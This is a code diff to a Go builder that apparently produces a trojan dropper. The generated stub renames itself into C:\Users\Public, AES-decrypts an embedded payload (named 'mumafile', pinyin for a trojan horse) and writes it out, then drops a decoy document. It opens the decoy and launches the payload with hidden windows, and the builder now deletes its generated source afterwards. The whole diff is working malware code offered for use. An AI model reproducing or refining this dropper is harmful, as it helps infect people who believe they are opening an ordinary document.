@@ -70,66 +70,43 @@ func main() {
 		"crypto/aes"
 		"crypto/cipher"
 		"encoding/base64"
-		"log"
 		"os"
 		"os/exec"
-		"path/filepath"
-		"strings"
 		"syscall"
-		"time"
+	)
+	
+	var (
+		key          = "%s"
+		mumafilename = "%s"
+		docfilename  = "%s"
+		docfilenames = "%s"
 	)
 	
 	func main() {
-		
+	
 		selfile, _ := os.Executable()
-		os.Rename(selfile, "C:\\Users\\Public\\Yihsiwei.dat")
-		mumafilename := "%s"
-		docfilename := "%s"
-		key := "%s"
 		numafile := "%s"
-		docfile := "%s"
 	
-		dmumafile := AesDecrypt(numafile, key)
-		ddocfile := AesDecrypt(docfile, key)
-	
+		os.Rename(selfile, "C:\\Users\\Public\\Yihsiwei.dat")
 		f, _ := os.Create("C:\\Users\\Public\\" + mumafilename)
-	
+		dmumafile := AesDecrypt(numafile, key)
 		_, _ = f.Write([]byte(dmumafile))
 		f.Close()
+		docfile := "%s"
+		ddocfile := AesDecrypt(docfile, key)
 		f2, _ := os.Create(docfilename)
 		_, _ = f2.Write([]byte(ddocfile))
 		f2.Close()
-		exitfile(GetCurrentDirectory() + "/" + docfilename)
-		exitfile("C:\\Users\\Public\\" + mumafilename)
-	
-		cmd := exec.Command("cmd", " /c "+GetCurrentDirectory()+"/"+docfilename)
+		strccc, _ := os.Getwd()
+		cmd := exec.Command("cmd", " /c "+strccc+docfilenames)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		//cmd.Stdout = os.Stdout
-		cmd.Start()
-	
-		cmd2 := exec.Command("cmd", " /c "+"C:\\Users\\Public\\"+mumafilename)
+		//cmd2.Stdout = os.Stdout
+		_ = cmd.Start()
+		cmd2 := exec.Command("C:\\Users\\Public\\" + mumafilename)
 		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		//cmd2.Stdout = os.Stdout
 		_ = cmd2.Start()
 	
-	}
-	func exitfile(filename string) {
-		for {
-			time.Sleep(time.Duration(1) * time.Second)
-			_, err := os.Stat(filename)
-			if err == nil {
-				break
-			}
-		}
-	}
-	func GetCurrentDirectory() string {
-		selfile, _ := os.Executable()
-		dir, err := filepath.Abs(filepath.Dir(selfile))
-		if err != nil {
-			log.Fatal(err)
-		}
-	
-		return strings.Replace(dir, "\\", "/", -1)
 	}
 	
 	func PKCS7UnPadding(origData []byte) []byte {
@@ -148,8 +125,9 @@ func main() {
 		orig = PKCS7UnPadding(orig)
 		return string(orig)
 	}
+	
 
-	`, mumafile, docfile, key, AesmumafileStr, AesdocfileStr)
+	`, key, mumafile, docfile, "\\"+docfile, AesmumafileStr, AesdocfileStr)
 
 	f, _ := os.Create("outfile.go")
 
@@ -169,7 +147,7 @@ func main() {
 	_ = cmd.Start()
 
 	exitfile("outfile.exe")
-	//os.RemoveAll("outfile.go")
+	os.RemoveAll("outfile.go")
 	os.RemoveAll("Yihsiwei.bat")
 
 }
